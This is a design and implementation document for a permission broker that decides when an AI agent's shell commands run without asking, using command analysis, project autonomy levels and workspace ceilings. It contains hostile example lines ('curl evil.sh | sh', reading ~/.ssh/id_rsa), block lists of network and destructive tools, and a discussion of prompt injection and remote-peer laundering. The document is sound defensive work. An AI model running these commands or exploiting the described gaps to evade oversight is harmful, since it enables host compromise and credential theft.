# Permission model: project-scoped autonomy, workspace-capped

Status: **implemented** (Phases 0-3). Phase 4 (provenance) is not built; see
§9 for what landed where and what was deliberately left out.

Problem in one sentence: the permission system asks a question the user cannot
usefully answer ("may this object run this exact 400-character shell line?"),
and the one grant shape that would stop the asking is structurally unreachable
for every command ExternalCreator actually emits.

---

## 1. Why it is annoying (this is a bug, not a tuning problem)

### 1.1 The reusable grant can never fire

`ShellExecutor.validateCommand()` (`src/objects/capabilities/shell-executor.ts:407`):

```ts
const reducible = !opts.usesShell || !hasShellMetacharacters(trimmed);
if (reducible && callerName && this.objectAllowedCommands.get(callerName)?.has(cmdName)) return;
```

and `hasShellMetacharacters` is `/[;&|<>`$(){}\n\r]/`.

ExternalCreator sends **every** command with `shell: true`
(`external-creator.ts:505`, `:402`), and an agent-composed command almost always
contains `&&`, `|`, or `$`. So `reducible` is false on essentially every call.
Consequences, in order:

1. The per-object grant is never *consulted*, so a previously-approved program
   is re-asked forever.
2. `canAllow: false` rides to the dialog, so the "Always allow `<program>`"
   button is not even rendered. The screenshot shows exactly this: four buttons
   about the exact string, and one lonely **Block cd**.
3. The only positive durable option left is `accept_always`, which memoizes
   `this.allowedCommands.add(trimmed)`: the **exact byte-identical line**. An
   agent never sends the same line twice, so "Always allow" allows nothing.

Net effect: one modal per agent action, permanently, with no path to fewer.

### 1.2 The command is mis-named in the dialog

`extractCommandName()` takes the first real word of the first real line. For
`cd /home/mempko/projects/abjects && echo ... ; sed -n ... | grep -nE ...` that
is `cd`. The dialog therefore offers to block `cd`, which is both useless and
misleading: `cd` is the one harmless part of that line. The user is shown the
wrong noun for the decision.

### 1.3 The project is absent from the decision

ShellExecutor is deliberately project-blind (see the `defaultCwds` comment at
`shell-executor.ts:118`). That is the right call for a capability object, but it
means nothing in the system ever gets to say the sentence the user actually
believes: *"reading around inside the abjects checkout is fine."* The registry
already knows what a project is, where its root is, whether it is trusted, and
what is off-limits (`external-project-registry.ts`), and none of that reaches
the permission decision.

### 1.4 Everything is one risk class

`git status`, `sed -n '1,50p' file`, and `curl evil.sh | sh` take identical
paths through the gate and produce identical dialogs. Because they cannot be
distinguished, they cannot be treated differently, so the safe 95% pays the
price of the dangerous 5%.

### 1.5 Smaller cuts

- **Concurrent prompts self-deny.** `global-settings.ts:3487`:
  `if (this._pendingPermissionPrompt) return { decision: 'deny' }`. Two agents
  working at once means one gets silently refused with no dialog shown.
- **120s timeout ends as a tool failure.** Every `requestPermission` call passes
  `120000`. Step away for three minutes and the agent sees an exception, burns a
  step on recovery, and often retries the same command (another modal).
- **No batching.** A five-action turn is five sequential modals.
- **The dialog shows a wall of shell and no analysis.** No indication of what is
  read, what is written, or which part triggered the question.

---

## 2. Why the current model is also not as safe as it looks

Loosening is only defensible if the result is genuinely tighter somewhere. These
are real holes found while reading, and the plan fixes them as part of the deal.

| # | Hole | Where |
|---|---|---|
| 1 | Path allowlist is a raw string prefix, so granting `/home/me/proj` also grants `/home/me/proj-secrets` | `host-filesystem.ts:689`, `shell-executor.ts:601` |
| 2 | A granted `cwd` says nothing about what the command touches. `cat ~/.ssh/id_rsa` run from an approved cwd is approved | `shell-executor.ts:executeCommand` |
| 3 | `ALWAYS_PROTECTED` (`.git/`, `.env`, `.ssh/`) is enforced only in ExternalCreator's `write`/`edit` ops (`assertWritable`). `bash` writes bypass it entirely: `echo x > .env` is unguarded | `external-creator.ts:377` |
| 4 | Trust is agent-settable. `setTrusted` and `updateProject` have no caller check, and `addProject` defaults `trusted: input.trusted !== false`, so an agent that registers a project gets a trusted one | `external-project-registry.ts:264,282,326,376` |
| 5 | Every command inherits the full host env: `{ ...process.env, ...skillEnv, ...req.env }`, so every approved `curl` carries every API key on the box | `shell-executor.ts:executeCommand` |
| 6 | `accept_always` stores whole command lines including any inline secrets, then renders them in the Settings list | `global-settings.ts:3649` |
| 7 | Nothing in a message records that it originated with a remote peer, so a public workspace's exposed object can drive a host capability and the gate sees a purely local caller | `core/types.ts:31`, `peer-router.ts:857` |

Hole 4 matters most for this plan: the design leans on project trust, so trust
must become user-only before anything is built on top of it. Hole 7 is why the
workspace ceiling in §4.3 is a ceiling and not a default.

---

## 3. Principles

1. **Decompose, do not pattern-match.** Shell metacharacters are a reason to
   *parse*, not a reason to give up. Every segment of a compound line is
   classified; the line is only as safe as its most dangerous segment.
2. **Scope beats memory.** The durable unit is `(caller, what-kind-of-thing,
   where)`, not a command string. "ExternalCreator may run read-only commands
   inside abjects" is a sentence a human can hold; a SHA of a shell line is not.
3. **Autonomy is a property of a place you named.** Auto-approval only applies
   inside a registered, trusted external project, gated on the resolved cwd.
   Outside one, behavior is exactly what it is today.
4. **Reachability caps trust.** How much a workspace is exposed to other peers
   bounds how much any project reached from it may do without asking. A local
   workspace keeps its project's level; a public one collapses to `ask`. The two
   axes multiply rather than add: a trusted directory reached from an
   internet-facing workspace is not a trusted situation.
5. **Unknown is not safe.** An unrecognized program, or a line we cannot parse
   with confidence, is treated as `exec`, never as `read`. Being unknown costs a
   prompt, not a containment failure.
6. **Classification is code, never an LLM.** The agent reads attacker-controlled
   files. Asking a model "is this command safe" puts a prompt-injection target
   inside the security boundary.
7. **The agent cannot escalate itself.** No action, no message, and no ask
   protocol raises an autonomy level. Only the user, through UI.
8. **Auto implies visible.** Anything approved without a modal is written to a
   decision log with its reason, and the level is shown in the taskbar with a
   one-click revert.

---

## 4. The design

### 4.1 `src/core/command-analysis.ts` (new, pure, no I/O)

A quote-aware tokenizer splits a line on `&&`, `||`, `;`, `|`, and newlines, and
walks into `$( )`, backticks, and `xargs`/`sh -c` payloads. It returns:

```ts
export type EffectClass = 'read' | 'write' | 'exec' | 'network' | 'dangerous';

export interface Segment {
  program: string;            // basename after env-assignment stripping
  argv: string[];
  effect: EffectClass;
  reads: string[];            // literal path arguments
  writes: string[];           // redirection targets, -o/-i/--output, etc.
}

export interface CommandAnalysis {
  segments: Segment[];
  effect: EffectClass;        // max over segments
  opaque: boolean;            // could not be reduced with confidence
  opaqueReason?: string;      // 'command substitution', 'pipe into shell', ...
  reads: string[];
  writes: string[];
}
```

`opaque` is set for command substitution feeding a program, `eval`, piping into
`sh`/`bash`/`python`, base64 into an interpreter, and any construct the
tokenizer does not model. **Opaque never auto-approves** at any level below
`full`, and never at any level if it also touches a protected path.

A **program effect table** (data, extensible in Settings) carries the classes:

- `read`: `ls cat head tail wc file stat pwd which echo printf find grep rg sed`
  (`-n` only, no `-i`), `awk` (no redirect), `jq`, `diff`, `du`, `tree`,
  `git status|log|diff|show|rev-parse|ls-files|branch|blame|stash list`,
  `node --version`, `tsc --noEmit`, `pnpm -v`
- `write`: `mkdir touch cp mv tee`, `sed -i`, `git add|commit|checkout|switch|
  stash|restore|merge|rebase`, `pnpm|npm|yarn run`, `make`, `cargo build|test`,
  `pytest`, redirections `>` `>>`
- `network`: `curl wget nc ssh scp rsync gh git push|pull|fetch|clone`,
  `npm|pnpm install|add|publish`, `docker pull|push`
- `dangerous` (never auto at any level): `sudo su doas chmod chown dd mkfs
  shutdown reboot systemctl launchctl crontab kill killall`, `rm -rf` with an
  argument at or above the project root or outside it, `git push --force`,
  `npm publish`, `gh release create`, anything writing under `~/.ssh`,
  `~/.aws`, `~/.config/gh`, or a `.env`

The same analyzer answers "which paths does this line touch", which is what
finally lets protected paths cover `bash` (hole 3) and lets a cwd grant stop
implying a whole-filesystem grant (hole 2).

### 4.2 Project autonomy levels

One new field on `ExternalProject`:

```ts
/** How much this project's work may proceed without asking. User-set only. */
autonomy: 'ask' | 'read' | 'edit' | 'full';   // default 'read'
```

This is the level the project *asks for*, not the level it gets: §4.3 caps it by
the calling workspace's access mode, and the smaller of the two wins.

Evaluated **only** when the resolved cwd is inside `project.root` and
`project.trusted === true`. Outside a project, or untrusted, the level is forced
to `ask`.

| Level | Auto-approves | Still prompts |
|---|---|---|
| `ask` | nothing (today's behavior) | everything |
| `read` | non-opaque lines whose every segment is `read` and whose paths stay inside the root | writes, network, exec, opaque, anything outside the root |
| `edit` | `read` plus `write` segments whose targets are inside the root and outside protected paths | network, `exec` of unknown programs, opaque, escapes, protected paths |
| `full` | everything except the always-deny set and anything leaving the root | always-deny set, escapes outside the root, writes to protected paths |

`full` is offered with a warning, and the UI recommends pairing it with
`isolation: 'worktree'` (already supported) so the blast radius is a scratch
checkout rather than the user's tree.

Defaults: a user adding a project through the browser gets `read`. A project
added by an agent gets `ask` and `trusted: false`.

### 4.3 Workspace access mode is a ceiling over the project level

A project level says how much the *place on disk* is trusted. It says nothing
about who can reach the agent doing the work. `WorkspaceAccessMode`
(`workspace-manager.ts:74`) already answers that second question, and it has to
outrank the first.

What the modes mean today, from `PeerRouter.evaluatePermission`
(`peer-router.ts:899`):

| Mode | Who may message exposed objects in the workspace |
|---|---|
| `local` | nobody remote (`return false`) |
| `private` | peers on `whitelist` |
| `public` | any peer that finds it |

So in a public workspace, an exposed object is an internet-facing entry point.
If anything downstream of it can reach ExternalCreator or ShellExecutor, a
stranger's message ends in a command on the host. Auto-approval there would turn
a convenience feature into remote code execution, which is why the ceiling is
non-negotiable and not merely a default.

**The rule.** The level that actually applies is

```
effective = min(project.autonomy, ceiling(callerWorkspace.accessMode))
```

with `min` over the ordered scale `ask < read < edit < full`, and

| Access mode | Ceiling | Reasoning |
|---|---|---|
| `local` | `full` | Nothing remote can reach it, so the project level stands as written |
| `private` | `edit` | Named, whitelisted peers, so writes inside the project root are defensible; network and unbounded exec are not |
| `public` | `ask` | Every host command prompts, whatever the project says |

`public` deliberately collapses to today's behavior rather than to a slightly
loosened one. The user asked for the most restrictive setting there, and "most
restrictive" for a capability this sharp means a human sees every command.

Two consequences worth stating plainly:

- **Raising a workspace to public silently tightens permissions**, which is the
  correct direction for a surprise. The Settings access-mode dropdown
  (`settings.ts:622`) gains a line saying so, and the broker logs the change,
  because an agent whose prompts suddenly return is otherwise a mystery.
- **The ceiling is evaluated per request from the caller's workspace**, not from
  the active one. A background public workspace does not get the active local
  workspace's ceiling, and per the background-workspaces-are-first-class rule
  nothing here throttles it: it is restricted, not suspended.

Resolving the caller's workspace is machinery ShellExecutor already has.
`lookupNameInWorkspace` (`shell-executor.ts:530`) asks WorkspaceManager for
`listWorkspacesDetailed` and finds the workspace whose `childIds` contain the
caller. The broker does the same lookup and caches it, and a caller it cannot
place resolves to `ask`. Unplaceable means unknown, and unknown is not safe.

#### 4.3.1 The gap this does not close: provenance

The ceiling is a property of *where the calling object lives*, not of *what
caused the call*. An object in a local workspace that takes work from an exposed
object in a public one launders the ceiling, and nothing in the envelope
records it: `MessageRouting` is `{ from, to, method }` (`core/types.ts:31`), so
by the time a request reaches ShellExecutor, a remote-originated chain looks
exactly like a locally-typed one. `PeerRouter`'s conn-track (`peer-router.ts:857`)
widens this a little further by accepting return traffic to any object that
previously talked to a peer.

The real fix is a provenance marker propagated through the bus: an optional
`origin?: { peer: PeerId; workspace: string }` on the envelope, stamped by
PeerRouter on inbound delivery and copied onto every message an object sends
while handling a tainted one. Then the broker can force `ask` for anything
touched by a remote origin regardless of workspace, and the dialog can say
**"triggered by peer 4f2a…"**, which is the single most useful sentence a
permission prompt could ever show.

That is a real change: it touches `core/types.ts`, `message.ts`, the stateful
`wire-codec.ts` interning codec, and every place a handler synthesizes an
outbound message. It is scoped as its own phase below rather than smuggled in
here, and until it lands, the workspace ceiling plus "exposed objects should not
reach host capabilities" is the containment story.

A cheap interim guard worth having regardless: the broker refuses auto-approval
outright when the calling object is **itself in the workspace's
`exposedObjectIds`**, since that object is directly addressable by a peer and
needs no laundering at all.

### 4.4 `src/objects/permission-broker.ts` (new global system object)

Policy does not belong in ShellExecutor (a capability with no opinion about
projects) or in GlobalSettings (a settings window). Per the single-purpose
convention it gets its own Abject.

```
capability object ──requestPermission──▶ PermissionBroker ──requestPermission──▶ GlobalSettings (dialog)
                  ◀─────decision────────                  ◀───────decision──────
```

- Claims `setPermissionsAuthority` on ShellExecutor, HostFileSystem,
  HttpClient, and StreamClient at boot, **before** GlobalSettings does
  (`setPermissionsAuthority` is first-caller-wins, so bootstrap order in
  `server/index.ts` decides this; GlobalSettings' `claimAuthority` moves to
  claiming on the broker instead).
- On a request it: analyzes the command, resolves the project from the cwd via
  `ExternalProjectRegistry.resolveProject`, applies always-deny, then rules,
  then the autonomy level, and either answers directly or forwards to
  GlobalSettings for a dialog.
- Owns the durable rule store, the task-scoped grants, the auto-approval budget,
  and the decision log.
- GlobalSettings keeps owning the dialog widgets and the Settings lists.
  ShellExecutor keeps its local allow/deny sets as a fast path and stays
  project-blind: its comment stays true.

Payload additions on `requestPermission` (all optional, backward compatible):
`cwd`, `usesShell`, `callerId`, plus the broker's own `analysis` when it
forwards to the dialog.

### 4.5 Rule shapes that survive arguments

Three durable kinds, all with a scope, all editable in Settings:

```ts
type Scope = { kind: 'project'; name: string }
           | { kind: 'path'; root: string }
           | { kind: 'anywhere' };

type Rule =
  | { kind: 'class';   caller: string; effect: EffectClass; scope: Scope; allow: boolean }
  | { kind: 'program'; caller: string; program: string;     scope: Scope; allow: boolean }
  | { kind: 'exact';   caller: string; command: string;                   allow: boolean };
```

A compound line is allowed by rules only if **every** segment is allowed. Deny
rules outrank allow rules at every level (unchanged precedence). `exact` stays
for the rare literal case, and its stored text is redacted first (hole 6).

Plus ephemeral, non-persisted:

```ts
{ kind: 'task'; taskId: string; ... }  // dropped when the task reports done/fail
```

### 4.6 The dialog, rebuilt around the analysis

The modal stops showing a naked shell line and starts showing the decision:

```
ExternalCreator wants to run a command in abjects

  cd … && sed -n … | grep -nE …                       [expand]

  Programs   cd, sed, grep            Effect  read-only
  Reads      mempko2.log, src/runtime/worker-bridge.ts, …
  Writes     nothing
  Asking because   abjects is set to "ask"

  This task            [ Allow for this task ]  [ Deny ]
  In abjects           [ Allow read-only commands ]  [ Allow sed ]
  Anywhere             [ Allow once ]  [ Never allow ]  [ Block sed ]
```

Changes that matter:

- Buttons are grouped by **breadth**, narrowest first, recommendation first.
- The offered program is the **riskiest** segment, not the first word, so it is
  never "block cd" again.
- `Allow read-only commands in <project>` is the single button that removes the
  overwhelming majority of prompts, and it is a sentence the user can evaluate.
- `Allow for this task` is the low-commitment escape hatch.
- The prompt **queue** replaces the auto-deny: a second request waits and the
  window shows "2 more waiting". Answering can optionally apply to matching
  queued requests.
- The 120s timeout is replaced by an unbounded, cancellable wait, and a waiting
  request reports back as `pending` rather than as an error, so
  `AgentAbject` parks the step instead of treating it as a failed action.

### 4.7 Containment work that ships with it

1. Boundary-aware path comparison everywhere (`resolved === ap ||
   resolved.startsWith(ap + path.sep)`), fixing hole 1 in both HostFileSystem
   and ShellExecutor.
2. Protected paths enforced for `bash` writes via the analyzer's `writes` list,
   fixing hole 3. `ALWAYS_PROTECTED` becomes deny-with-prompt rather than a
   silent pass.
3. `setTrusted`, `setAutonomy`, and the trust/autonomy fields of
   `updateProject` become authority-gated the way `GlobalSettings.respond`
   already is: a boot-sealed responder id, refusing anything else. `addProject`
   flips to `trusted: input.trusted === true` and `autonomy: 'ask'` unless the
   caller is the user-facing browser. Fixes hole 4.
4. Filtered env for auto-approved commands in a project: `PATH HOME LANG TERM`,
   the project's declared vars, and skill env, instead of all of `process.env`.
   Fixes hole 5. Prompted commands keep today's env so nothing breaks silently.
5. Redaction pass over any command before it reaches a dialog, a log, or the
   rule store. Fixes hole 6.
6. Auto-approval budget: N approvals or M minutes per task before re-confirming.
   On by default for `full`, off for `read`, configurable. This is the backstop
   against a looping agent grinding unattended.
7. Taskbar indicator whenever any project sits above `ask`, with one click to
   drop every project back to `ask`.

---

## 5. The screenshot, replayed

`cd /home/mempko/projects/abjects && echo '=== LOG ==='; sed -n '154400,154690p'
mempko2.log | grep -nE 'WORKSPACE-MANAGER|…' | head -60; …`

- Analyzer: 8 segments, programs `cd echo sed grep head`, all `read`, no
  redirection, all paths inside `/home/mempko/projects/abjects`, not opaque.
- Broker: cwd resolves to project `abjects`, trusted, `autonomy: 'read'`.
- Caller: ExternalCreator in workspace **The Horror**, `accessMode: 'local'`,
  ceiling `full`. Effective level `min(read, full)` is `read`.
- Decision: **auto-approve**, logged as `read-only in abjects (8 segments)`.
- Modals shown: **zero**.

Change one thing and the answer changes:

| Change | Outcome |
|---|---|
| `sed -i` instead of `sed -n` | `write`: prompts at `read`, auto at `edit` |
| `> /tmp/out.txt` | escapes the root: prompts at every level |
| `$(cat ~/.ssh/id_rsa)` anywhere in the line | opaque *and* protected path: prompts even at `full` |
| same command, workspace set to `private` | ceiling `edit`, so `read` still stands: still zero modals |
| same command, workspace set to `public` | ceiling `ask`: modal, every time, exactly as today |

That last row is the point of §4.3. The command did not get more dangerous; the
room it is being run from did.

---

## 6. Phases

**Phase 0 (safety only, no loosening).** `command-analysis.ts`, boundary-aware
path matching, always-deny set, authority-gate on trust, redaction. Shippable on
its own, strictly tightens the current model. Ends with the analyzer wired to
*log* what it would have decided so its accuracy is measurable before it decides
anything.

**Phase 1 (broker + dialog).** PermissionBroker as authority, forwarding every
decision to today's dialog. Prompt queue, `pending` instead of timeout errors,
analysis-driven dialog, decision log, riskiest-segment naming. Still no
auto-approval: annoyance drops, permissiveness does not move.

**Phase 2 (autonomy, capped).** `autonomy` field, level policy, the workspace
ceiling and its caller-workspace lookup, the exposed-object refusal, the three
rule shapes, task-scoped grants, ExternalProjectBrowser UI, the access-mode note
in Settings, taskbar indicator and kill switch. This is where the modals stop.
The ceiling ships **in the same phase as** auto-approval, never after it: a
release where public workspaces can auto-run host commands is not one to have
existed, even briefly.

**Phase 3 (hardening).** Filtered env, protected-path enforcement for bash
writes, budgets, `full` coupled to worktree isolation, Settings UI for the
program effect table.

**Phase 4 (provenance).** Optional `origin` on the message envelope, stamped by
PeerRouter on inbound delivery and propagated by the bus through derived
messages; broker forces `ask` for anything remote-tainted and the dialog names
the peer. Touches `core/types.ts`, `message.ts`, `wire-codec.ts`, and the
handler paths that synthesize outbound messages, so it stands alone. It closes
hole 7 properly and turns the §4.3 ceiling from the containment story into a
redundant second layer, which is where a ceiling should end up.

---

## 7. Deliberately not doing

- **A global "auto-approve everything" checkbox.** Unscoped, unrevocable in
  practice, and the first thing anyone regrets.
- **LLM-judged command safety.** Prompt-injectable through any file the agent
  reads.
- **Regex risk-scoring the raw line.** Trivially bypassed by quoting and
  substitution; decomposition or nothing.
- **Letting the agent request an escalation.** Not as an action, not through the
  ask protocol. The user raises levels in the UI or they do not get raised.
- **Auto-approval outside a registered project.** The named directory is what
  makes the whole thing bounded.
- **Letting a project level override the workspace ceiling.** No per-project
  exception, no "I know what I'm doing" checkbox on a public workspace. If you
  want the level, make the workspace local.
- **Blocking host capabilities outright in public workspaces.** Tempting, and
  wrong: it would break legitimate shared work, and per the
  background-workspaces-are-first-class rule the answer to exposure is
  restriction, not suspension. Public means every command is seen by a human,
  not that no command runs.

---

## 8. Open questions for you

1. **Default level for a user-added project.** `read` is my recommendation:
   it kills the majority of prompts on day one and cannot modify anything.
   `ask` is more conservative but reproduces today's experience until the user
   finds the setting.
2. **Should `edit` auto-approve the project's own declared `checkCommand` /
   `verifyCommand`?** They are user-declared strings, so I lean yes even though
   they are `exec`, treating declaration as approval.
3. **Budget defaults.** I proposed off for `read`, on for `full`. Alternative:
   always on with a generous ceiling, so a runaway loop always eventually stops.
4. **Does `full` require worktree isolation, or merely warn?** Requiring it is
   defensible and would make `full` genuinely safe; it also makes `full`
   unavailable for non-git projects.
5. **Is `edit` the right ceiling for `private`?** Whitelisted peers are people
   you named, so writes inside a project root seem fair, and `edit` still
   prompts for network and unknown exec. The conservative alternative is `read`,
   which means anyone sharing a workspace with you sees your agent stop to ask
   before every file write.
6. **Should a workspace carry its own explicit ceiling too?** Access mode is a
   good proxy for exposure but it is not literally a permission setting, and
   overloading it means changing who can see a workspace also changes what
   agents may do in it. The alternative is a separate per-workspace
   `agentAutonomyCeiling` field, defaulted from the access mode but
   independently settable: more precise, one more control to explain.
7. **Where does the effective level get surfaced?** My inclination is the
   ExternalProjectBrowser row showing both numbers when they differ, e.g.
   `edit (capped to ask by public workspace)`, so the ceiling is never a silent
   mystery. Worth confirming that is the surface you want it on rather than the
   taskbar indicator alone.


---

## 9. What landed

### New files

| File | What it is |
|---|---|
| `src/core/command-analysis.ts` | The analyzer: quote-aware lexer, per-segment classification, program effect table, containment, protected-write detection, credential redaction. Pure, no I/O. |
| `src/core/path-scope.ts` | Boundary-aware `isInside` / `isInsideAny` / `deepestContaining`, closing the `proj` vs `proj-secrets` prefix hole. |
| `src/objects/permission-broker.ts` | The policy object. Holds the permissions authority, applies autonomy capped by workspace access mode, owns the rule store, the session grants, the budget, the prompt queue, and the decision log. |

### Changed

- **`src/core/abject.ts`** — `resolveCallerIdentity` (name **and** typeId, resolved
  from the registry, never from the payload) and `resolveDep`, both promoted to
  the base class. `ShellExecutor`, `LLMObject` and `ExternalCreator` lost their
  private copies. The workspace fallback now also reaches the global registry.
- **`src/objects/capabilities/shell-executor.ts`** — the `reducible` gate is
  gone. A line is decomposed and a grant applies when **every** program in it is
  granted, which is what makes a grant reusable at all. Passes `cwd` and
  `callerId` to the authority, waits 31 minutes rather than 2, and drops
  credential-shaped environment variables from commands approved by policy alone.
- **`src/objects/capabilities/host-filesystem.ts`** — boundary-aware allow list,
  longer wait.
- **`src/objects/external-project-registry.ts`** — the `autonomy` field,
  `setAutonomy`, and the authority gate. `addProject` no longer trusts on
  request; `updateProject` drops `trusted`/`autonomy` from a non-authority;
  losing trust drops the level with it. Stored projects migrate: a trusted
  project written before autonomy existed lands on `read`.
- **`src/objects/external-project-browser.ts`** — the Autonomy control (a
  cycling button with a confirmation that explains each level) and a row badge
  showing the level actually in force, with what capped it.
- **`src/objects/global-settings.ts`** — the dialog is now generic: it renders
  whatever option groups the broker hands it, shows the analysis (programs,
  effect, reads, writes, why you are being asked), and no longer owns policy.
  Registers with the broker as the settings authority and forwards permission
  changes through it. New Autonomy card with the "Take the wheel" reset.
- **`src/objects/workspace-registry.ts`** — `getFallbackRegistry`, so a
  per-workspace object can identify a global caller. `lookup` deliberately still
  does not chain: several callers use a miss to mean "not in this workspace".
- **`src/objects/external-creator.ts`** — clears its task-scoped grants when a
  task ends.
- **`server/index.ts` / `workers/abject-worker-node.ts`** — PermissionBroker
  registered in both, spawned after Identity (it needs a system typeId) and
  before GlobalSettings (`setPermissionsAuthority` is first-caller-wins).

### One design change made during the build

The plan gated trust and autonomy on the caller's **registered name**.
Verification showed that is only safe while the legitimate holder exists: a
workspace that has not spawned its UI objects leaves the name
`ExternalProjectBrowser` free for anything to claim, and a user object could
declare it. The gate now matches on **typeId**, which the Factory assigns at
spawn: a built-in is `{peer}/{workspace}/{Name}` while a user object is
`{peer}/{workspace}/user/{Name}`, so the namespace cannot be claimed at all.

### Verified

Headless, against the real backend booted in-process (the `verify` skill's
recipe), 18 checks, all passing:

- a pre-upgrade trusted project migrates to `read`
- the screenshot's compound command runs in **18ms with no prompt**; a second,
  differently-shaped read-only line also runs unprompted
- an unattended command carries `HOME` but not credential-shaped variables
- five things still stop and ask: a write at `read` level, a path outside the
  project, an opaque line, a dangerous line, reading a credential file; and the
  refused write never happened on disk
- auto-approvals are logged with a reason ("read-only in vproj at read (4 segments)")
- `public` caps the level to `ask` and the same command then prompts; `private`
  allows `read`; back to `local` it runs unprompted again
- an agent cannot set trust, cannot launder it through `updateProject`, and
  cannot register a trusted project, while still being able to edit ordinary
  project fields
- `takeTheWheel` drops the level and commands ask again

### Not built

- **Phase 4, provenance.** Unchanged from §6: it needs an envelope field
  propagated through `wire-codec.ts` and every handler that synthesizes an
  outbound message, so it stands alone. Until it lands, hole 7 is covered by the
  workspace ceiling plus the exposed-object refusal, not closed.
- **A Settings editor for the program effect table.** Listed under Phase 3.
  Skipped deliberately: a user-editable risk table is a control whose only
  interesting use is downgrading a program's class, which is the one direction
  that costs safety. The table is data in `command-analysis.ts` and easy to
  extend in code.
- **A taskbar indicator.** The plan asked for one; the status line and the reset
  button live in Settings > Permissions instead, and the project browser shows
  the live level per row. The taskbar rebuilds on every object registration, so
  putting a broker query or a per-decision event stream behind it is the shape
  that has flooded this bus before.
- **`callerId` on HostFileSystem's path prompts.** Threading it would touch
  every handler and helper signature in that object. Project roots are already
  pre-granted at registration, so the prompts this would remove are for paths
  outside every registered project, which should ask anyway.
